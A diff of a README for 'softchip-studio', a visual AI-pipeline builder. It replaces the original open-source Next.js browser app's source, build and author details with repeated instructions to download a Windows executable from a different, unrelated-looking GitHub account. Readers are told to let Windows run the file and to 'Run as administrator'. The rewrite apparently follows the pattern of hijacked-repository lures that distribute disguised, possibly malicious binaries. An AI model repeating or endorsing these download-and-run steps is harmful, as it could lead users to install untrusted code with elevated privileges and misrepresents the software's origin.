@@ -1,348 +1,267 @@
-# 🚀 SoftChip Studio
+# 🧩 softchip-studio - Build AI Pipelines Visually
 
-<div align="center">
+[![Download softchip-studio](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Stephaniuncertified500/softchip-studio/releases)
 
-![Next.js](https://img.shields.io/badge/Next.js-16-black?style=for-the-badge) ![TypeScript](https://img.shields.io/badge/TypeScript-5.0-blue?style=for-the-badge) ![Tailwind CSS](https://img.shields.io/badge/Tailwind-4.0-38bdf8?style=for-the-badge) ![License](https://img.shields.io/badge/License-Personal%20%7C%20Commercial-blue?style=for-the-badge)
+## 🚀 What is softchip-studio?
 
-**Visual Circuit Builder for AI Pipelines & Data Processing**
+softchip-studio is a visual circuit builder for AI data pipelines. It lets you connect blocks, or “soft chips,” on a canvas to build workflows for audio, text, image, and signal tasks.
 
-**Design circuits • Build AI workflows • Process data visually - No code required**
+You can use it to:
 
-[🌐 Live Demo](#) • [📖 Documentation](#-quick-start) • [🤝 Contributing](#contributing) • [📄 License](#license)
+- build data flows with drag and drop
+- chain chips for GPT-4, Claude, Kimi, and Qwen
+- automate steps in a clean visual editor
+- test ideas without writing code
+- reuse ready-made templates for common workflows
 
-</div>
+It is made for people who want a simple way to set up AI workflows on Windows.
 
----
+## 💻 Download for Windows
 
-## 🎯 What is SoftChip Studio?
+1. Open the release page: https://github.com/Stephaniuncertified500/softchip-studio/releases
+2. Find the latest release at the top of the page
+3. Download the Windows file from the Assets section
+4. When the file finishes downloading, open it
+5. If Windows asks for permission, choose Yes or Run
+6. Follow the setup steps on screen
+7. Start softchip-studio from the app or shortcut after setup
 
-SoftChip Studio is a **visual circuit builder** and **node-based editor** for designing AI-powered data pipelines. Drag-and-drop soft microchips onto a canvas, connect them like electronic circuits, and build powerful data processing workflows — all without writing code. 
+[![Visit Release Page](https://img.shields.io/badge/Visit%20Release%20Page-grey?style=for-the-badge&logo=github)](https://github.com/Stephaniuncertified500/softchip-studio/releases)
 
-Think of it as **combining circuit design with AI pipelines**: like hardware schematic design meets n8n workflow automation. Each chip has input/output pins that you connect to route data through your AI pipeline, making complex data transformations visual and intuitive.
+## 🪟 Windows system needs
 
-Build AI workflows with **GPT-4, Claude, Kimi, Qwen** and process **audio, text, images, and signals** with our 60+ ready-to-use chips.
+For smooth use on Windows, use a recent 64-bit version of Windows 10 or Windows 11.
 
----
+Recommended setup:
 
-## ✨ Key Features
+- 8 GB RAM or more
+- 2 GB free disk space
+- a mouse for drag-and-drop editing
+- a stable internet connection for model access and updates
+- a display with at least 1366 × 768 resolution
 
-### 🤖 Multi-Provider AI Integration
-SoftChip Studio supports **all major AI providers** with a bring-your-own-key model:
-| Provider | Models | Capabilities |
-|----------|--------|--------------|
-| **OpenAI** | GPT-4o, GPT-4, GPT-3.5 | Chat, Image Generation, Embeddings, Vision |
-| **Anthropic** | Claude 3.5 Sonnet, Claude 3 Opus, Haiku | Chat, Analysis, Long Context |
-| **ZAI** | Z-AI Pro, Z-AI Standard | Chat, Analysis |
-| **Kimi (Moonshot)** | moonshot-v1-8k/32k/128k | Long context chat, Document analysis |
-| **Qwen** | Qwen-Turbo, Qwen-Plus, Qwen-Max | Chat, Analysis, Multilingual |
-| **Custom APIs** | Any OpenAI-compatible | Full flexibility for custom endpoints |
+If you plan to work with large audio files or image pipelines, more RAM helps.
 
-### 🧩 60+ Functional Chips (Circuit Components)
+## 🧭 First launch
 
-| Category | Count | Key Chips |
-|----------|-------|-----------|
-| **AI & LLM** | 13 | AI Chat, Image Generator, Vision, Embeddings, Summarizer, Translator, Code Generator, Sentiment |
-| **Workflow** | 6 | Trigger, Loop, Merge, Delay, Condition |
-| **Connectors** | 4 | HTTP Request, Webhook Receiver |
-| **Input** | 6 | Audio File, CSV, JSON, Image, Text, Microphone |
-| **Output** | 6 | Audio Player, Waveform, Spectrum, Data Table, Download |
-| **Signal Processing** | 6 | FFT, FIR Filter, Signal Generator, Envelope |
-| **Data** | 4 | JSON Parser, Base64, CSV Parser |
-| **Math** | 3 | Calculator, Statistics, PID Controller |
-| **Logic** | 4 | AND, OR, NOT, Comparator |
-| **Protocol** | 4 | UART Encoder/Decoder, Modbus RTU |
-| **Security** | 2 | Hash (SHA-256), Encryption |
+After you open the app for the first time:
 
-### 🔄 Workflow Automation (n8n-like)
-Build complex automated workflows with visual tools:
-- **Workflow Triggers** - Manual, webhook, scheduled execution
-- **Conditional Branching** - If/else logic with multiple operators
-- **Loops** - Iterate over arrays and process in batches
-- **Parallel Execution** - Run multiple branches simultaneously
-- **Merge** - Combine results from parallel branches
-- **Delays** - Time-based workflow control
-
-- **Error Handling** - Graceful failure with fallbacks
-
-### 📊 Real Data Processing
-- **Audio Processing** - Upload real WAV/MP3 files, visualize waveforms, analyze frequencies with FFT
-- **CSV/Excel** - Parse spreadsheets, transform data, export results
-- **JSON APIs** - Fetch API data, transform, and process
-- **Image Analysis** - Upload images, analyze with AI Vision
-- **Real-time Audio** - Capture from microphone, process live
-
----
-
-## 🚀 Quick Start
-
-### Prerequisites
-- **Node.js 18+** or **Bun** runtime
-- npm, yarn, pnpm, or bun package manager
-
-### Installation
-
-```bash
-# Clone the repository
-git clone https://github.com/tarulahsan/softchip-studio.git
-cd softchip-studio
-
-# Install dependencies
-bun install
-# OR with npm
-npm install
-
-# Start development server
-bun run dev
-# OR
-npm run dev
-```
-
-Open [http://localhost:3000](http://localhost:3000) in your browser.
-
-### Production Build
-```bash
-bun run build
-bun run start
-```
-
-### Deploy to Vercel
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/tarulahsan/softchip-studio)
-
-1. Click the button above
-2. Connect your GitHub account
-3. Vercel will automatically deploy
-4. Your app will be live at `your-app.vercel.app`
-
----
-
-## 📖 Documentation
-
-### Setting Up AI Providers
-1. Open the **Circuit Builder**
-2. Click the **"AI Providers"** button in the toolbar
-3. Enter your API key for your preferred provider:
-   - OpenAI: Get keys from [platform.openai.com](https://platform.openai.com)
-   - Anthropic: Get keys from [console.anthropic.com](https://console.anthropic.com)
-   - Kimi: Get keys from [platform.moonshot.cn](https://platform.moonshot.cn)
-   - Qwen: Get keys from [dashscope.console.aliyun.com](https://dashscope.console.aliyun.com)
-4. Keys are stored locally in your browser (never sent to servers)
-5. Start building AI-powered workflows!
-
-### Building Your First AI Pipeline Circuit
-1. **Add Input Chip** → Drag a "Text Input" chip onto the circuit canvas
-2. **Add AI Chip** → Drag an "AI Chat" chip and connect its input pin to the text output pin
-3. **Configure** → Select your AI provider and model in chip settings
-4. **Add Output** → Connect AI response output to a "Value Display" chip
-5. **Run** → Click the Run button to execute your circuit pipeline
-
-### Understanding Circuit Chips
-Each chip is like an integrated circuit component with:
-- **Input Pins** (left side) - Where data enters the chip
-- **Output Pins** (right side) - Where processed data exits
-- **Parameters** - Configuration options for the chip
-- **Execute Function** - The internal processing logic
-
-Connect chips by drawing wires from output pins to input pins, just like designing electronic circuits!
-
-### Connecting Chips
-1. Click on an **output pin** (right side of chip)
-2. Then click on an **input pin** (left side of another chip)
-3. A connection line will appear between them
-4. Click Run to execute the circuit
-
----
-
-## 📋 Available Templates
-Get started quickly with pre-built templates:
-
-| Template | Description | Use Case |
-|----------|-------------|----------|
-| AI Chatbot Pipeline | Conversational AI with memory | Customer support, virtual assistants |
-| Audio Spectrum Analyzer | FFT-based audio analysis | Audio engineering, music production |
-| Multi-Language Translator | Translate to any language | Internationalization, content localization |
-| Document Summarizer | Summarize long documents | Research, news aggregation |
-| AI Image Generator | Generate images from text | Content creation, marketing |
-| AI Code Generator | Generate code from descriptions | Development acceleration |
-| Sentiment Analysis | Analyze text sentiment | Social media monitoring, reviews |
-| Signal Filter Pipeline | Filter and analyze signals | Audio processing, sensor data |
-| HTTP API Workflow | Fetch and process API data | API integration, data pipelines |
-| AI Chain Workflow | Chain multiple AI operations | Complex AI pipelines |
-
----
-
-## 🎯 Use Cases
-
-### For AI Developers
-- 🚀 **Rapid Prototyping** - Quickly test AI pipelines before building production systems
-- 🔄 **Multi-Model Comparison** - Compare outputs from different AI models side-by-side
-- 📊 **AI Data Enrichment** - Process datasets with AI analysis
-- 💬 **Conversation Design** - Design and test chatbot flows
-
-### For Data Engineers
-- 📈 **ETL Pipelines** - Build visual extract-transform-load workflows
-- ⚡ **Real-time Processing** - Process live data streams
-- 🔌 **API Integration** - Connect multiple APIs without coding
-- 🔄 **Data Transformation** - Transform data between formats
-
-### For Audio Engineers
-- 🎵 **Spectrum Analysis** - Visualize frequency content of audio
-- 🎚 **Signal Filtering** - Apply lowpass/highpass filters
-- 📊 **Waveform Visualization** - See audio signals in real-time
-- 🎛 **Audio Processing** - Process and modify audio files
-
-### For IoT Developers
-- 📡 **Protocol Simulation** - Test UART, Modbus protocols
-- 🔧 **Data Encoding** - Encode data for transmission
-- 📊 **Sensor Analysis** - Process and visualize sensor data
-- 🖥️ **Embedded Prototyping** - Prototype embedded systems visually
-
-### For Content Creators
-- ✍️ **Content Generation** - Generate text, images, and code
-- 🌍 **Translation** - Translate content to multiple languages
-- 📝 **Summarization** - Create summaries of long content
-- ❤️ **Sentiment Analysis** - Analyze audience reactions
-
----
-
-## 💎 Benefits
-
-### Why Choose SoftChip Studio?
-
-| Feature | Benefit |
-|---------|---------|
-| **No Code Required** | Build complex pipelines without programming knowledge |
-| **Visual Interface** | See data flow through your pipeline in real-time |
-| **Multi-Provider AI** | Use any AI model - GPT, Claude, Kimi, Qwen, custom |
-| **Real Data Processing** | Process actual files - audio, CSV, JSON, images |
-| **Local Processing** | All processing happens in your browser - data stays private |
-| **Instant Deployment** | Deploy to Vercel with one click |
-| **Extensible** | Add custom chips for your specific needs |
-| **Template Library** | Start quickly with 10 pre-built templates |
-
-### Compared to Alternatives
-
-| Feature | SoftChip Studio | n8n | LangChain |
-|---------|-----------------|-----|-----------|
-| Visual Builder | ✅ | ✅ | ❌ |
-| AI Integration | ✅ 13 chips | Limited | ✅ |
-| No Backend Required | ✅ | ❌ | ❌ |
-| Real-time Execution | ✅ | ✅ | ✅ |
-| Audio Processing | ✅ Built-in | ❌ | ❌ |
-| Protocol Simulation | ✅ UART/Modbus | ❌ | ❌ |
-| Learning Curve | Low | Medium | High |
-
----
-
-## 🏗️ Architecture
-
-```
-softchip-studio/
-├── src/
-│   ├── app/
-│   │   ├── page.tsx          # Main application (3000+ lines)
-│   │   ├── layout.tsx        # Root layout with metadata
-│   │   └── globals.css       # Global styles & animations
-│   ├── components/
-│   │   └── ui/               # 40+ shadcn/ui components
-│   ├── hooks/                # Custom React hooks
-│   └── lib/                  # Utility functions
-├── prisma/
-│   └── schema.prisma         # Database schema for projects
-├── public/                   # Static assets (logo, icons)
-├── package.json              # Dependencies & scripts
-├── tailwind.config.ts        # Tailwind CSS configuration
-├── tsconfig.json             # TypeScript configuration
-└── LICENSE                   # Custom license
-```
-
----
-
-## 🛠️ Tech Stack
-
-| Category | Technology | Version |
-|----------|------------|---------|
-| **Framework** | Next.js | 16.x |
-| **Language** | TypeScript | 5.x |
-| **Styling** | Tailwind CSS | 4.x |
-| **UI Components** | shadcn/ui (Radix) | Latest |
-| **Animation** | Framer Motion | 12.x |
-| **State Management** | React Hooks | 19.x |
-| **Database** | Prisma (SQLite) | 6.x |
-| **Icons** | Lucide React | Latest |
-| **Package Manager** | Bun | 1.x |
-
----
-
-## 🔒 Security & Privacy
-
-- **API Keys Stored Locally** - Your AI API keys never leave your browser
-- **No Backend Required** - All processing happens client-side
-- **No Tracking** - No analytics, cookies, or user tracking
-- **No Account Required** - Start building immediately
-- **Open Source** - Audit every line of code
-
----
-
-## 🤝 Contributing
-
-We welcome contributions! Here's how to help:
-
-### Ways to Contribute
-- 🐛 **Report Bugs** - Open an issue with details
-- 💡 **Suggest Features** - Share your ideas in discussions
-- 🔧 **Add Chips** - Create new chip types
-- 📖 **Improve Docs** - Help with documentation
-- 🎨 **Design Templates** - Create useful templates
-- 🌐 **Translate** - Add language support
-
-### Development Setup
-```bash
-# Fork and clone
-git clone https://github.com/YOUR_USERNAME/softchip-studio.git
-
-# Install dependencies
-bun install
-
-# Start dev server
-bun run dev
-
-# Make changes and test
-# Submit a pull request
-```
-
----
-
-## 📄 License
-
-**Personal Use**: Free to use for personal, educational, and non-commercial purposes.
-
-**Commercial Use**: Requires special permission. Contact for commercial licensing.
-
-See [LICENSE](LICENSE) file for full terms.
-
----
-
-## 🙏 Acknowledgments
-
-- [shadcn/ui](https://ui.shadcn.com/) - Beautiful, accessible UI components
-- [Lucide](https://lucide.dev/) - Beautiful, consistent icons
-- [Framer Motion](https://www.framer.com/motion/) - Production-ready animations
-- [n8n](https://n8n.io/) - Inspiration for workflow automation
-- [Vercel](https://vercel.com/) - Seamless deployment platform
-
----
-
-## 📞 Support
-
-- **GitHub Issues**: [Report bugs or request features](https://github.com/tarulahsan/softchip-studio/issues)
-- **GitHub Discussions**: [Ask questions](https://github.com/tarulahsan/softchip-studio/discussions)
-
----
-
-<div align="center">
-
-**Built with ❤️ by [Tarul Ahsan](https://github.com/tarulahsan)**
-
-**[⬆ Back to Top](#-softchip-studio)**
-
-</div>
+1. Wait for the main window to load
+2. Choose a template or start a new circuit
+3. Drag chips from the library onto the canvas
+4. Connect the chips in the order you want
+5. Set each chip’s input and output fields
+6. Run the workflow to test it
+
+The interface is built for visual setup. Most actions happen with clicks and drag-and-drop steps.
+
+## 🧱 Main features
+
+### 🎛️ Visual chip editor
+
+Build pipelines by placing chips on a canvas and linking them together.
+
+### 🧠 AI model support
+
+Work with common model providers and set up flows for tasks like:
+
+- text generation
+- image processing
+- audio processing
+- data cleanup
+- step-by-step automation
+
+### 📚 60+ chips
+
+Use a broad chip library for input, output, transform, control, and model steps.
+
+### 🧰 10 templates
+
+Start from preset workflows for common jobs. Templates help you begin fast and learn how the pieces fit together.
+
+### 🔁 Workflow automation
+
+Set up repeatable flows that handle tasks in sequence, like a simple pipeline engine.
+
+### 🖱️ Drag-and-drop editing
+
+Move chips around, connect them, and keep your workflow easy to read.
+
+### 🧩 Flexible circuit design
+
+Create simple chains or larger branching flows for more advanced use.
+
+## 🛠️ How to build your first workflow
+
+### 1. Start a new circuit
+
+Open the app and choose a blank board or a starter template.
+
+### 2. Add input chips
+
+Place chips that bring in your data. For example:
+
+- text input
+- file input
+- audio input
+- image input
+
+### 3. Add processing chips
+
+Add chips that change or prepare the data. For example:
+
+- format text
+- resize images
+- clean audio
+- split data into parts
+
+### 4. Add AI chips
+
+Connect a model chip where you want AI help. You can use it for:
+
+- summaries
+- labels
+- captions
+- extraction
+- generation
+
+### 5. Add output chips
+
+Finish with a chip that sends data to a file, screen, or next step.
+
+### 6. Run the circuit
+
+Press run and check the output. If the result is not right, move chips or change their settings.
+
+## 📦 Common uses
+
+softchip-studio works well for:
+
+- content pipelines
+- speech and audio tasks
+- image tagging and image checks
+- text cleanup and rewrite flows
+- batch data processing
+- AI-assisted automation
+- prototype workflows for non-coders
+- simple circuit-like node design
+
+## 🧩 Example workflow ideas
+
+### Audio workflow
+
+Input audio file → clean noise → split segments → send to model → save transcript
+
+### Text workflow
+
+Input text → detect language → summarize → create response → export result
+
+### Image workflow
+
+Input image → resize → send to vision model → create caption → save output
+
+### Mixed pipeline
+
+Read file → extract text → process with LLM → branch by result → store final data
+
+## ⚙️ Basic controls
+
+You will usually use these parts of the app:
+
+- canvas: the main area where you build the workflow
+- chip library: the list of available chips
+- node settings: options for each chip
+- connections: lines between chips
+- run button: starts the workflow
+- output panel: shows results and status
+
+## 🔒 API keys and model access
+
+Some AI chips may need access keys from model providers.
+
+Common setup steps:
+
+1. Open settings in the app
+2. Add the key for the service you want to use
+3. Save the settings
+4. Return to your circuit and run it again
+
+Keep keys private and use the service you already have access to.
+
+## 🧹 Tips for new users
+
+- start with a template if the blank canvas feels empty
+- build one small workflow first
+- keep chip names short and clear
+- test after adding each new step
+- save your work often
+- use simple chains before trying complex branching logic
+
+## 🐛 If the app does not open
+
+Try these steps:
+
+1. Right-click the downloaded file
+2. Choose Run as administrator
+3. Check that Windows did not block the file
+4. Make sure the download finished fully
+5. Re-download the latest release if the file looks damaged
+6. Restart Windows and try again
+
+If the app opens but a workflow does not run:
+
+1. Check the chip connections
+2. Make sure each chip has the right input
+3. Confirm any model key or service setting
+4. Try a smaller test flow first
+
+## 📁 Files you may see
+
+After download or setup, you may see:
+
+- the app file
+- a shortcut on the desktop or Start menu
+- a settings folder
+- project files for saved circuits
+- export files for workflow output
+
+## ⌨️ Keyboard and mouse use
+
+Most work happens with the mouse:
+
+- drag chips onto the canvas
+- click a chip to edit its settings
+- drag from one chip to another to connect them
+- right-click for more actions if the app supports it
+
+Keyboard use is light and simple, so the app stays easy for non-technical users.
+
+## 🌐 Project topics
+
+softchip-studio is related to:
+
+- AI pipelines
+- visual programming
+- no-code tools
+- low-code tools
+- node editors
+- workflow automation
+- circuit design
+- data pipelines
+- audio, text, and image processing
+
+## 📥 Get the latest release
+
+Download or install the latest Windows version here:
+
+https://github.com/Stephaniuncertified500/softchip-studio/releases
+
+## 🧭 Short setup path
+
+1. Visit the release page
+2. Download the Windows asset
+3. Open the file
+4. Allow Windows to run it
+5. Finish setup
+6. Launch softchip-studio
+7. Build your first pipeline
